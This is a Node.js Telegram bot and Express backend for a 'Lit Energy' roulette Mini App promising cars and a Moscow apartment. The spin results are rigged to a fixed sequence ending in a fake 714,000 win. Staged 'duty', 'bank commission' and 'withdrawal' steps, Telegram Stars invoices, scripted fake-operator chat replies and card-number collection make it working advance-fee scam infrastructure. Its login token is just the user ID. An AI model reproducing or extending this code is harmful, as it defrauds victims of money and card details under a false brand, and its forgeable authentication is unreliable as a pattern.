require('dotenv').config()

const fs = require('node:fs')
const path = require('node:path')

const express = require('express')
const TelegramBot = require('node-telegram-bot-api')

const token = process.env.TELEGRAM_BOT_TOKEN
const webAppUrl = process.env.TELEGRAM_WEBAPP_URL
const promoImageUrl = process.env.TELEGRAM_PROMO_IMAGE_URL
const port = Number(process.env.PORT || 3000)

if (!token) process.exit(1)
if (!webAppUrl) process.exit(1)

const bot = new TelegramBot(token, { polling: true })
const app = express()

app.use(express.json())

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
    if (req.method === 'OPTIONS') return res.sendStatus(204)
    next()
})

const FX_USD_RUB_TTL_MS = 60 * 60 * 1000
let fxUsdRubCache = null

const fetchUsdRubRate = async () => {
    const r = await fetch('https://www.cbr-xml-daily.ru/daily_json.js')
    if (!r.ok) {
        throw new Error(`Failed to fetch USD/RUB rate: ${r.status}`)
    }

    const data = await r.json()
    const usd = data?.Valute?.USD
    const value = Number(usd?.Value)
    const nominal = Number(usd?.Nominal)

    if (!Number.isFinite(value) || value <= 0) throw new Error('USD/RUB rate value missing')
    if (!Number.isFinite(nominal) || nominal <= 0) throw new Error('USD/RUB nominal missing')

    return {
        rate: value / nominal,
        date: typeof data?.Date === 'string' ? data.Date : null,
        timestamp: typeof data?.Timestamp === 'string' ? data.Timestamp : null,
        source: 'cbr-xml-daily',
    }
}

app.get('/api/rates/usd-rub', async (_req, res) => {
    try {
        const now = Date.now()
        if (fxUsdRubCache && now - fxUsdRubCache.fetchedAt < FX_USD_RUB_TTL_MS) {
            return res.json({ ok: true, ...fxUsdRubCache })
        }

        const fresh = await fetchUsdRubRate()
        fxUsdRubCache = { ...fresh, fetchedAt: now }
        return res.json({ ok: true, ...fxUsdRubCache })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e?.message || 'Unknown error' })
    }
})

const AUTH_STORE_PATH = path.join(__dirname, 'authorized-users.json')
let authStore = {}

try {
    authStore = JSON.parse(fs.readFileSync(AUTH_STORE_PATH, 'utf8'))
} catch {
    authStore = {}
}

const GAME_INITIAL_ATTEMPTS = 5
const LOSE_STREAK_BEFORE_WIN = 3
const WIN_SPIN_MIN = 4
const WIN_SPIN_MAX = 6

const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min

const computeWinOnSpin = () => {
    const minSpin = Math.max(WIN_SPIN_MIN, LOSE_STREAK_BEFORE_WIN + 1)
    const maxSpin = Math.min(WIN_SPIN_MAX, GAME_INITIAL_ATTEMPTS)
    if (maxSpin < minSpin) return null
    return randomInt(minSpin, maxSpin)
}

const ensureGameState = (game) => {
    const attemptsLeft = Number.isInteger(game?.attemptsLeft) ? Math.max(0, game.attemptsLeft) : GAME_INITIAL_ATTEMPTS
    const spinsDone = Number.isInteger(game?.spinsDone) ? Math.max(0, game.spinsDone) : 0
    const hasWon = Boolean(game?.hasWon)
    const winOnSpin = Number.isInteger(game?.winOnSpin) && game.winOnSpin > 0 ? game.winOnSpin : computeWinOnSpin()

    return { attemptsLeft, spinsDone, hasWon, winOnSpin }
}

const ensurePaymentsState = (payments) => {
    const dutyPaidAt = typeof payments?.dutyPaidAt === 'string' ? payments.dutyPaidAt : null
    const dutyStars = Number.isInteger(payments?.dutyStars) ? payments.dutyStars : null

    return { dutyPaidAt, dutyStars }
}

// ── Mini App state ────────────────────────────────────────────────────────────

const SPIN_SEQUENCE = [
    { spin: 'attempts', attempts: 3 },
    { spin: 'fail-1',   amount: 0 },
    { spin: 'fail-2',   amount: 0 },
    { spin: '714_000',  amount: 714000 },
]

const ROULETTE_SLOT_INDEX = {
    '350_000': 0, 'fail-1': 1, 'classic': 2, '200_000': 3, 'chips-hot': 4,
    'attempts': 5, '10_000': 6, 'berry-coconut': 7, 'fail-2': 8, 'chips-white': 9,
    'toyota': 10, 'original': 11, '450_000': 12, 'peach': 13, 'fail-3': 14,
    'porsche': 15, 'home': 16, '714_000': 17, 'granat': 18, 'g63_amg': 19,
    'fail-4': 20, 'mix': 21, '100_000': 22, '18_chips': 23, '20_000': 24,
    'fail-5': 25, 'blueberry': 26, '1_000_000': 27, 'bmw': 28, 'mango': 29,
    'fail-6': 30, '50_000': 31,
}

const GIFT_EXPIRES_AT = '2026-03-26T20:12:03.391487'

const INITIAL_STAGES = {
    payment_stage: 0, start_chat_stage: 0, checking_stage: 0,
    withdrawal_chat_stage: 0, bank_commission_stage: 0, signature_stage: 0,
}

const APP_CHAT_REPLIES = [
    { name: 'Оператор', text: 'Сообщение получено. Продолжайте оформление выплаты по инструкции на экране.', color: 'lime' },
    { name: 'Поддержка', text: 'Для оформления выплаты следуйте инструкции на экране.', color: 'blue' },
    { name: 'Модератор', text: 'Ваш запрос обрабатывается. Продолжайте.', color: 'purple' },
]

const ensureAppState = (app) => ({
    spinIndex: Number.isInteger(app?.spinIndex) ? app.spinIndex : 0,
    lastProcessedSpinIndex: Number.isInteger(app?.lastProcessedSpinIndex) ? app.lastProcessedSpinIndex : -1,
    balance: Number.isFinite(app?.balance) ? app.balance : 0,
    availableSpins: Number.isInteger(app?.availableSpins) ? app.availableSpins : 1,
    cardNumber: typeof app?.cardNumber === 'string' ? app.cardNumber : '',
    stages: { ...INITIAL_STAGES, ...(app?.stages ?? {}) },
    chatReplyIndex: Number.isInteger(app?.chatReplyIndex) ? app.chatReplyIndex : 0,
})

function makeToken(userId) { return String(userId) }

function userIdFromRequest(req) {
    const auth = req.headers['authorization'] ?? ''
    if (auth.startsWith('Bearer ')) {
        const id = Number(auth.slice(7))
        if (Number.isInteger(id) && id > 0) return id
    }
    return null
}

function parseInitData(raw) {
    try {
        const params = new URLSearchParams(raw)
        const user = JSON.parse(params.get('user') ?? 'null')
        if (user?.id) return user
    } catch {}
    return null
}

const saveAuthStore = () => {
    try {
        fs.writeFileSync(AUTH_STORE_PATH, JSON.stringify(authStore, null, 2))
    } catch (err) {
        console.error('Failed to save auth store:', err)
    }
}

// ── /api/v1/* — Mini App API backed by authStore ─────────────────────────────

// POST /api/v1/auth/login  { init_data: string }
app.post('/api/v1/auth/login', (req, res) => {
    const initData = req.body?.init_data
    const user = parseInitData(initData)
    if (!user?.id) return res.status(400).json({ detail: 'invalid init_data' })

    const userId = Number(user.id)
    const nowIso = new Date().toISOString()
    const existing = authStore[String(userId)]
    const app_ = ensureAppState(existing?.app)
    const payments = ensurePaymentsState(existing?.payments)

    authStore[String(userId)] = {
        userId,
        username: user.username ?? existing?.username ?? null,
        firstName: user.first_name ?? existing?.firstName ?? null,
        lastName: user.last_name ?? existing?.lastName ?? null,
        firstSeenAt: existing?.firstSeenAt ?? nowIso,
        lastSeenAt: nowIso,
        app: app_,
        payments,
        game: ensureGameState(existing?.game),
    }
    saveAuthStore()

    const token = makeToken(userId)
    return res.json({ access_token: token, refresh_token: token })
})

// POST /api/v1/auth/refresh
app.post('/api/v1/auth/refresh', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const token = makeToken(userId)
    return res.json({ access_token: token, refresh_token: token })
})

// GET /api/v1/me
app.get('/api/v1/me', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    return res.json({
        balance: app_.balance,
        available_spins: app_.availableSpins,
        gift_expires_at: GIFT_EXPIRES_AT,
        card_number: app_.cardNumber,
    })
})

// PATCH /api/v1/me/card-number  { card_number: string }
app.patch('/api/v1/me/card-number', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    app_.cardNumber = String(req.body?.card_number ?? app_.cardNumber)
    authStore[String(userId)] = { ...u, app: app_ }
    saveAuthStore()
    return res.json({
        balance: app_.balance,
        available_spins: app_.availableSpins,
        gift_expires_at: GIFT_EXPIRES_AT,
        card_number: app_.cardNumber,
    })
})

// GET /api/v1/results
app.get('/api/v1/results', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    if (app_.availableSpins <= 0) return res.status(422).json({ detail: 'No spins available' })
    const result = SPIN_SEQUENCE[app_.spinIndex] ?? SPIN_SEQUENCE[SPIN_SEQUENCE.length - 1]
    return res.json(result)
})

// POST /api/v1/finish
app.post('/api/v1/finish', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    const spinIdx = app_.spinIndex
    if (spinIdx > app_.lastProcessedSpinIndex) {
        const spin = SPIN_SEQUENCE[spinIdx] ?? null
        if (spin) {
            app_.availableSpins = Math.max(0, app_.availableSpins - 1)
            if (spin.spin === 'attempts') {
                app_.availableSpins += spin.attempts || 3
            } else if (typeof spin.amount === 'number' && spin.amount > 0) {
                app_.balance = spin.amount
            }
            const slotIdx = ROULETTE_SLOT_INDEX[spin.spin]
            if (slotIdx !== undefined && !app_.rouletteIdx) {
                app_.rouletteIdx = slotIdx
            }
        }
        app_.lastProcessedSpinIndex = spinIdx
        app_.spinIndex = spinIdx + 1
    }
    authStore[String(userId)] = { ...u, app: app_ }
    saveAuthStore()
    return res.json({ status: 'ok' })
})

// GET /api/v1/stages
app.get('/api/v1/stages', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    return res.json(ensureAppState(u.app).stages)
})

// PATCH /api/v1/stages  { <stage_name>: number, ... }
app.patch('/api/v1/stages', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    app_.stages = { ...app_.stages, ...req.body }
    authStore[String(userId)] = { ...u, app: app_ }
    saveAuthStore()
    return res.json(app_.stages)
})

// POST /api/v1/invoice  { method, amount, title, next_stages }
app.post('/api/v1/invoice', async (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    try {
        const { amount, title, description, next_stages } = req.body || {}
        const stars = Number(amount)
        if (!Number.isInteger(stars) || stars <= 0) return res.status(400).json({ detail: 'invalid amount' })

        const payload = JSON.stringify({ type: 'purchase', purpose: 'duty', userId, amountStars: stars, next_stages, ts: Date.now() })
        const r = await fetch(`https://api.telegram.org/bot${token}/createInvoiceLink`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                title: title || 'Покупка',
                description: description || 'Оплата в Mini App',
                payload,
                currency: 'XTR',
                prices: [{ label: 'Оплата', amount: stars }],
            }),
        })
        const data = await r.json()
        if (!data.ok) return res.status(500).json({ detail: data.description || 'Telegram API error' })
        return res.json({ link: data.result })
    } catch (e) {
        return res.status(500).json({ detail: e.message || 'Unknown error' })
    }
})

// POST /api/v1/chat/message  { text: string }
app.post('/api/v1/chat/message', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return res.status(401).json({ detail: 'unauthorized' })
    const u = authStore[String(userId)]
    if (!u) return res.status(401).json({ detail: 'unauthorized' })
    const app_ = ensureAppState(u.app)
    const reply = APP_CHAT_REPLIES[app_.chatReplyIndex % APP_CHAT_REPLIES.length]
    app_.chatReplyIndex += 1
    authStore[String(userId)] = { ...u, app: app_ }
    saveAuthStore()
    return res.json({ name: reply.name, text: reply.text, color: reply.color, echo: req.body?.text || '' })
})

const ensureMenuButton = async () => {
    try {
        await bot.setChatMenuButton({
            menu_button: {
                type: 'web_app',
                text: 'Играть',
                web_app: { url: webAppUrl },
            },
        })
    } catch (err) {
        console.error('Failed to set chat menu button:', err)
    }
}

void ensureMenuButton()

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id

    const replyMarkup = {
        inline_keyboard: [
            [
                {
                    text: 'Открыть охоту',
                    web_app: { url: webAppUrl },
                },
            ],
        ],
    }

    const caption =
        `⚡️ Легендарная охота на Lit Energy!

🔥 Мы исполняем ваши мечты! Легендарная и, возможно, заключительная охота уже идет ❤️‍🔥

Крути рулетку и получай шанс выиграть:
🚗 Toyota Supra
🏎 BMW M3
🔥 Porsche 911
🚙 Mercedes-Benz G63 AMG

🏆 Главный приз — квартира в Москве за 40 млн руб.`

    if (promoImageUrl) {
        await bot.sendPhoto(chatId, promoImageUrl, {
            caption,
            reply_markup: replyMarkup,
        })
        return
    }

    await bot.sendMessage(chatId, caption, {
        reply_markup: replyMarkup,
    })
})

app.post('/api/telegram/create-stars-invoice', async (req, res) => {
    try {
        const { userId, amount, title, description, purpose } = req.body || {}

        if (!userId) {
            return res.status(400).json({ ok: false, error: 'userId required' })
        }

        const stars = Number(amount)
        if (!Number.isInteger(stars) || stars <= 0) {
            return res.status(400).json({ ok: false, error: 'amount must be positive integer (Stars)' })
        }

        const rawPurpose = typeof purpose === 'string' ? purpose.trim() : 'duty'
        const safePurpose = rawPurpose && rawPurpose.length <= 32 ? rawPurpose : 'duty'

        const payload = JSON.stringify({
            type: 'purchase',
            purpose: safePurpose,
            userId,
            amountStars: stars,
            ts: Date.now(),
        })

        const body = {
            title: title || 'Покупка',
            description: description || 'Оплата в Mini App',
            payload,
            currency: 'XTR',
            prices: [
                { label: 'Оплата', amount: stars }
            ]
        }

        const r = await fetch(`https://api.telegram.org/bot${token}/createInvoiceLink`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })

        const data = await r.json()

        if (!data.ok) {
            return res.status(500).json({ ok: false, error: data.description || 'Telegram API error', raw: data })
        }

        return res.json({ ok: true, invoiceLink: data.result })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.post('/api/telegram/report-auth', async (req, res) => {
    try {
        const { user, platform, ts } = req.body || {}

        const userId = Number(user?.id)
        if (!Number.isInteger(userId) || userId <= 0) {
            return res.status(400).json({ ok: false, error: 'user.id required' })
        }

        const nowIso = new Date(Number.isFinite(ts) ? ts : Date.now()).toISOString()
        const existing = authStore[String(userId)]
        const game = ensureGameState(existing?.game)
        const payments = ensurePaymentsState(existing?.payments)

        authStore[String(userId)] = {
            userId,
            username: user?.username ?? existing?.username ?? null,
            firstName: user?.first_name ?? existing?.firstName ?? null,
            lastName: user?.last_name ?? existing?.lastName ?? null,
            platform: platform ?? existing?.platform ?? null,
            firstSeenAt: existing?.firstSeenAt ?? nowIso,
            lastSeenAt: nowIso,
            game,
            payments,
        }

        saveAuthStore()

        console.log(`[AUTH] userId=${userId} username=@${user?.username || ''} platform=${platform || ''} known=${!!existing}`)

        return res.json({ ok: true, known: !!existing, state: game, payments })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.post('/api/telegram/get-state', async (req, res) => {
    try {
        const { user, platform, ts } = req.body || {}

        const userId = Number(user?.id)
        if (!Number.isInteger(userId) || userId <= 0) {
            return res.status(400).json({ ok: false, error: 'user.id required' })
        }

        const existing = authStore[String(userId)]
        if (!existing) {
            return res.json({ ok: true, known: false })
        }

        const nowIso = new Date(Number.isFinite(ts) ? ts : Date.now()).toISOString()
        const game = ensureGameState(existing.game)
        const payments = ensurePaymentsState(existing.payments)

        authStore[String(userId)] = {
            ...existing,
            username: user?.username ?? existing?.username ?? null,
            firstName: user?.first_name ?? existing?.firstName ?? null,
            lastName: user?.last_name ?? existing?.lastName ?? null,
            platform: platform ?? existing?.platform ?? null,
            lastSeenAt: nowIso,
            game,
            payments,
        }

        saveAuthStore()

        return res.json({ ok: true, known: true, state: game, payments })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.post('/api/telegram/spin', async (req, res) => {
    try {
        const { userId, ts } = req.body || {}
        const id = Number(userId)
        if (!Number.isInteger(id) || id <= 0) {
            return res.status(400).json({ ok: false, error: 'userId required' })
        }

        const existing = authStore[String(id)]
        if (!existing) {
            return res.status(404).json({ ok: false, error: 'User not authorized' })
        }

        const nowIso = new Date(Number.isFinite(ts) ? ts : Date.now()).toISOString()
        const game = ensureGameState(existing.game)

        if (game.hasWon) {
            return res.json({ ok: true, state: game, win: true, alreadyWon: true })
        }

        if (game.attemptsLeft <= 0) {
            return res.status(400).json({ ok: false, error: 'No attempts left', state: game })
        }

        const nextSpinsDone = game.spinsDone + 1
        const win = game.winOnSpin != null && nextSpinsDone === game.winOnSpin

        const nextGame = {
            ...game,
            spinsDone: nextSpinsDone,
            attemptsLeft: game.attemptsLeft - 1,
            hasWon: game.hasWon || win,
        }

        authStore[String(id)] = {
            ...existing,
            lastSeenAt: nowIso,
            game: nextGame,
        }

        saveAuthStore()

        return res.json({ ok: true, state: nextGame, win })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.listen(port, () => {
    console.log(`HTTP server started on :${port}`)
})

bot.on('message', async (msg) => {
    const data = msg.web_app_data?.data
    if (!data) return

    let payload = data
    try {
        payload = JSON.stringify(JSON.parse(data), null, 2)
    } catch { }

    await bot.sendMessage(msg.chat.id, `Получены данные из формы:\n\n${payload}`)
})

bot.on('pre_checkout_query', async (query) => {
    try {
        await bot.answerPreCheckoutQuery(query.id, true)
    } catch (err) {
        console.error('pre_checkout_query error:', err)
    }
})

bot.on('successful_payment', async (msg) => {
    try {
        const payerId = msg.from?.id
        const nowIso = new Date().toISOString()

        if (payerId) {
            let purpose = null
            try {
                const parsed = JSON.parse(msg.successful_payment?.invoice_payload ?? 'null')
                purpose = parsed?.purpose ?? parsed?.product ?? null
            } catch { }

            const key = String(payerId)
            const existing = authStore[key]
            const game = ensureGameState(existing?.game)
            const payments = ensurePaymentsState(existing?.payments)

            if (purpose === 'duty' || purpose == null) {
                authStore[key] = {
                    userId: payerId,
                    username: existing?.username ?? msg.from?.username ?? null,
                    firstName: existing?.firstName ?? msg.from?.first_name ?? null,
                    lastName: existing?.lastName ?? msg.from?.last_name ?? null,
                    platform: existing?.platform ?? null,
                    firstSeenAt: existing?.firstSeenAt ?? nowIso,
                    lastSeenAt: nowIso,
                    game,
                    payments: {
                        ...payments,
                        dutyPaidAt: nowIso,
                        dutyStars: msg.successful_payment?.total_amount ?? payments.dutyStars ?? null,
                    },
                }

                saveAuthStore()
                console.log(`[PAYMENT] duty paid userId=${payerId} amount=${msg.successful_payment?.total_amount ?? ''}`)
            }
        }

        await bot.sendMessage(msg.chat.id, 'Оплата прошла успешно ✅')
        console.log('successful_payment:', msg.successful_payment)
    } catch (err) {
        console.error('successful_payment handler error:', err)
    }
})

bot.on('polling_error', (err) => {
    console.error('Polling error:', err)
})

const shutdown = async (signal) => {
    try {
        console.log(`Shutting down (${signal})...`)
        await bot.stopPolling()
    } finally {
        process.exit(0)
    }
}

process.on('SIGINT', () => void shutdown('SIGINT'))
process.on('SIGTERM', () => void shutdown('SIGTERM'))
